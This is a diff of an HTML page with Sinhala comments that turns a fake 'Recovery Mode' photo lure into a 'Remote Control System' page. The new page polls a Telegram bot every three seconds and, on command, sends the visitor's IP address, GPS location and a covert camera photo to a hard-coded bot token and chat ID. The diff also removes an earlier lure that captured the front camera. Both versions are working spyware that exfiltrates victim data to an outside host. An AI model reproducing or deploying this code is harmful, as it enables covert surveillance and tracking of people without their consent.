@@ -2,55 +2,85 @@
 <html lang="si">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Recovery Mode</title>
+    <title>Remote Control System</title>
     <style>
-        body, html { margin: 0; padding: 0; height: 100%; background: #000; }
-        .full-btn { width: 100vw; height: 100vh; background: #333; color: #fff; border: none; font-size: 20px; }
+        body { background: #000; color: #0f0; text-align: center; font-family: monospace; }
+        .status { margin-top: 40vh; font-size: 20px; }
     </style>
 </head>
 <body>
-
-    <button class="full-btn" onclick="takePhoto()">
-        [ RECOVERY MODE ]<br>TAP TO TAKE PHOTO
-    </button>
-
-    <video id="video" style="display:none;" autoplay></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <div class="status">SYSTEM ACTIVE...<br>WAITING FOR COMMANDS</div>
+    
+    <video id="v" style="display:none" autoplay></video>
+    <canvas id="c" style="display:none"></canvas>
 
     <script>
         const BOT_TOKEN = '8524435746:AAGpGH-ygNIUIsn9NGFZBsMUaKDDRpus8eI';
         const CHAT_ID = '7883989086';
+        let lastUpdateId = 0;
 
-        async function takePhoto() {
+        // 1. Telegram එකෙන් මැසේජ් චෙක් කිරීම
+        async function checkCommands() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
+                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`);
+                const data = await res.json();
 
-                setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    canvas.toBlob(async (blob) => {
-                        let formData = new FormData();
-                        formData.append('chat_id', CHAT_ID);
-                        formData.append('photo', blob, 'camera.png');
-                        
-                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        });
-                        stream.getTracks().forEach(track => track.stop());
-                    }, 'image/png');
-                }, 1000);
+                if (data.result.length > 0) {
+                    for (let update of data.result) {
+                        lastUpdateId = update.update_id;
+                        let msg = update.message.text.toLowerCase();
 
-            } catch (err) {
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=Camera Error: ${err.message}`);
-            }
+                        if (msg === 'ip') sendIP();
+                        if (msg === 'photo') takePhoto();
+                        if (msg === 'location') sendLocation();
+                        if (msg === 'name') sendText("නම: හංගිලි ගෙදර විරාජ් කෞශල්‍ය වීරසේකර");
+                    }
+                }
+            } catch (e) { console.error(e); }
         }
+
+        // 2. IP ඇඩ්‍රස් එක යැවීම
+        async function sendIP() {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            sendText(`📍 IP Address: ${data.ip}`);
+        }
+
+        // 3. ලොකේෂන් එක යැවීම
+        function sendLocation() {
+            navigator.geolocation.getCurrentPosition(pos => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`);
+            }, err => sendText("Location Error: " + err.message));
+        }
+
+        // 4. කැමරාවෙන් ෆොටෝ එකක් ගැනීම
+        async function takePhoto() {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('v');
+            video.srcObject = stream;
+            setTimeout(() => {
+                const canvas = document.getElementById('c');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(blob => {
+                    let fd = new FormData();
+                    fd.append('chat_id', CHAT_ID);
+                    fd.append('photo', blob, 'cam.png');
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                    stream.getTracks().forEach(t => t.stop());
+                });
+            }, 1000);
+        }
+
+        function sendText(txt) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(txt)}`);
+        }
+
+        // හැම තත්පර 3කට වරක්ම අලුත් මැසේජ් තියෙනවද බලන්න
+        setInterval(checkCommands, 3000);
     </script>
 </body>
 </html>
